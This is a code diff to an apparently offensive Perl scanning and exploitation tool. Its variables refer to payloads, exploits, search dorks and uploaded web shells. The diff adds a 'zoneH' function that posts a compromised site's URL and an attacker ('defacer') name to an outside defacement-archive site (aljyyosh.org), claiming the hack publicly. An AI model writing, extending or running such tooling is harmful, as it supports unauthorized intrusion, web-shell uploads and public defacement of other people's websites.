@@ -7,7 +7,7 @@ use POSIX qw(strftime);
 
 ## FUNCTS
 our ($payloads, $exploit, $expHost, $data, $mlevel, $dork, $Target, $V_RANG, $noQuery, $mdom, $replace, $replaceFROM, $unique, $ifinurl, $pat2, $limit, $port, $output, $ifend, $ipUrl, $noinfo,
-     $V_IP, $expIp, $interactive, $command, $uplog, $validShell, $validText, $notIn, $all, $repair);
+     $V_IP, $expIp, $interactive, $command, $uplog, $validShell, $validText, $notIn, $all, $repair, $zoneH);
 our (@aTscans, @userArraysList, @exploits, @dorks, @aTsearch, @aTcopy, @aTtargets, @c, @OTHERS, @DS, @DT, @TT, @proxies, @ErrT, @defaultHeaders, @userHeaders, @validTexts, @notIns);
 
 ## USER PRE-CONFIGURATION
@@ -612,6 +612,25 @@ sub checkUloadedShell {
     $isUploaded=$URL1;
   }
   return $isUploaded;
+}
+
+## ZONE-H
+sub zoneH {
+  my ($url, $uploader)=@_;
+  my $zoneHurl="http://aljyyosh.org/single.php";
+  my $ua = LWP::UserAgent->new;
+  my $res = $ua->post($zoneHurl,
+                 Content => ['defacer' => $uploader,
+				            'domain1' => $url,
+				            'hackmode' => '15',
+				            'reason' => '1',
+				            'Gönder' => 'Send',
+				            ]);
+  if ($res->content =~ /color\=\"red\"\>(.*)<\/font\><\/li\>/) {
+	print $c[1]."    ZONE-H  ".$c[3] . "$1 \n";
+  }else{
+	print $c[1]."    ZONE-H  ".$c[4] ."Fail to upload target!\n";
+  }
 }
 
 ## EXTRAT INFO PROCESS SCAN
